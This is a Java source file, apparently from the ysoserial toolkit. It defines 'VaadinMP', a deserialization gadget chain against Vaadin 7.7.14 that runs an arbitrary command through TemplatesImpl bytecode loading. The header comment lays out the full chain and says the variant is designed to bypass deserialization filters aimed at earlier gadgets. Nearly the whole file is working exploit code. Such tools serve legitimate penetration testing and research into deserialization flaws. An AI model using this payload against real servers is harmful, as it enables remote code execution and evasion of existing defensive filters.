package ysoserial.payloads;

import java.util.AbstractMap.SimpleEntry;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;

import com.vaadin.data.util.MethodProperty;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain (@kai_ullrich — MethodProperty variant):
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				SimpleEntry.equals() (hash collision, XOR commutative)
					AbstractMap.eq()
						ConcurrentHashMap.equals(TextAndMnemonicHashMap)
							AbstractMap.equals() iterates entries
								TextAndMnemonicHashMap.get(methodProperty)
									key.toString()
										AbstractProperty.toString()
											LegacyPropertyHelper.legacyPropertyToString()
												MethodProperty.getValue()
													Method.invoke()
														TemplatesImpl.getOutputProperties()
															... (bytecode loading, RCE)

	Differs from Vaadin1:
		- Entry: ConcurrentHashMap (not BadAttributeValueExpException)
		- Trigger: SimpleEntry.equals() via hash collision (not readObject)
		- Uses MethodProperty (not NestedMethodProperty)
		- Bypasses filters on BadAttributeValueExpException, NestedMethodProperty

	Requires:
		vaadin-server, vaadin-shared
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@Authors({ Authors.KULLRICH })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class VaadinMP extends PayloadRunner implements ObjectPayload<ConcurrentHashMap> {

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAtLeast(7);
	}

	public ConcurrentHashMap getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);

		// MethodProperty wraps TemplatesImpl.getOutputProperties()
		final MethodProperty<Object> methodProp = new MethodProperty<Object>(tpl, "outputProperties");

		// Prevent premature class loading during serialization
		Reflections.setFieldValue(tpl, "_auxClasses", null);

		// Inner ConcurrentHashMap containing the MethodProperty as a key.
		// When AbstractMap.equals() iterates this map's entries and passes
		// the key to TextAndMnemonicHashMap.get(), it triggers toString().
		final ConcurrentHashMap innerMap = new ConcurrentHashMap();
		innerMap.put(methodProp, "val");

		// TextAndMnemonicHashMap: its get() calls key.toString() on any key
		final Class<?> tamClass = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
		final HashMap tamMap = (HashMap) Reflections.createWithoutConstructor(tamClass);
		// HashMap requires loadFactor > 0 (constructor-skipped, so must set manually)
		Reflections.setFieldValue(tamMap, "loadFactor", 0.75f);

		// Outer ConcurrentHashMap with two SimpleEntry keys.
		// SimpleEntry.hashCode() = key.hashCode() ^ value.hashCode()
		// entry1 = (innerMap, tamMap), entry2 = (tamMap, innerMap)
		// XOR is commutative so both have the same hashCode -> collision on deser.
		// During construction, use safe dummy values to avoid premature trigger.
		final SimpleEntry entry1 = new SimpleEntry("safe1", "safe2");
		final SimpleEntry entry2 = new SimpleEntry("safe3", "safe4");

		final ConcurrentHashMap outerMap = new ConcurrentHashMap();
		outerMap.put(entry1, "a");
		outerMap.put(entry2, "b");

		// Now swap SimpleEntry fields to create the cross-reference pattern.
		// On deserialization: collision -> equals() -> chain fires.
		Reflections.setFieldValue(entry1, "key", innerMap);
		Reflections.setFieldValue(entry1, "value", tamMap);
		Reflections.setFieldValue(entry2, "key", tamMap);
		Reflections.setFieldValue(entry2, "value", innerMap);

		return outerMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(VaadinMP.class, args);
	}
}
